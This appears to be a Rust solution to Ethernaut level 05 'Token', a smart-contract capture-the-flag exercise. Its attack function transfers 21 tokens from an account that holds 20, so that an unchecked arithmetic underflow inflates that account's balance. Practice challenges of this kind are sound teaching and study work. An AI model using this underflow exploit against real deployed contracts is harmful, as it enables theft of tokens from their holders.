//! Ethernaut 05 — Token.
//!
//! Goal: Increase your offender account's `Token` balance above the twenty
//! tokens it receives at setup.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/Token.sol

use alloy::primitives::{Address, U256};
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl05_token::*;

pub struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let contract = Token::new(target.address, offender.provider());
        contract
            .transfer(Address::ZERO, U256::from(21))
            .from(offender.address())
            .send()
            .await?
            .watch()
            .await?;
        Ok(())
    }
}
